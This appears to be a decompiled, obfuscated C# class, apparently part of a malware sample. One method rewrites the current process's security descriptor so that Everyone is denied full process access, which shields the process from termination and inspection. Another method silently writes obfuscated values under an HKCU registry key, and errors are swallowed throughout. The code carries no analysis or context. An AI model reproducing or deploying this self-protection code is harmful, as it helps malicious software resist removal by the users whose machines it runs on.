using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace frgoWklvEOSV;

internal sealed class dDyurqCmIYO
{
	[NonSerialized]
	internal static GetString _0016;

	[DllImport("advapi32.dll", EntryPoint = "GetKernelObjectSecurity", SetLastError = true)]
	private static extern bool JWCMbZawsBteH(IntPtr OaApsaiJWBTboDYV, int GGYDxIzgOEHe, [Out] byte[] pcjIlFgZfJzCxk, uint egboQbWvdYUp, out uint vtuwIBfmZuHHB);

	[DllImport("advapi32.dll", EntryPoint = "SetKernelObjectSecurity", SetLastError = true)]
	private static extern bool DdsTwxAFAwR(IntPtr FrcYMHQHnHUlB, int tVMHAivbcumDjO, [In] byte[] bVUUJPXRQqeQHa);

	[DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
	private static extern IntPtr LBaWHVltWHfci();

	public void iRhAYdJtRklx(bool P_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(PFruJiQrcriiZ.GwTsezEgVAuVAU(_0016(107403392)));
			registryKey.SetValue(PFruJiQrcriiZ.GwTsezEgVAuVAU(_0016(107403255)), _0016(107404405));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor KJiAghXcDInbeBqcBB(IntPtr P_0)
	{
		byte[] pcjIlFgZfJzCxk = new byte[0];
		JWCMbZawsBteH(P_0, 4, pcjIlFgZfJzCxk, 0u, out var vtuwIBfmZuHHB);
		if (vtuwIBfmZuHHB < 0 || (long)vtuwIBfmZuHHB > 32767L)
		{
			return null;
		}
		if (!JWCMbZawsBteH(P_0, 4, pcjIlFgZfJzCxk = new byte[vtuwIBfmZuHHB], vtuwIBfmZuHHB, out vtuwIBfmZuHHB))
		{
			return null;
		}
		return new RawSecurityDescriptor(pcjIlFgZfJzCxk, 0);
	}

	private void mIZccETANlKcj(IntPtr P_0, RawSecurityDescriptor P_1)
	{
		byte[] array = new byte[P_1.BinaryLength];
		P_1.GetBinaryForm(array, 0);
		DdsTwxAFAwR(P_0, 4, array);
	}

	public void snmtsQVthnGhgVm()
	{
		try
		{
			IntPtr intPtr = LBaWHVltWHfci();
			RawSecurityDescriptor rawSecurityDescriptor = KJiAghXcDInbeBqcBB(intPtr);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			mIZccETANlKcj(intPtr, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static dDyurqCmIYO()
	{
		Strings.CreateGetStringDelegate(typeof(dDyurqCmIYO));
	}
}
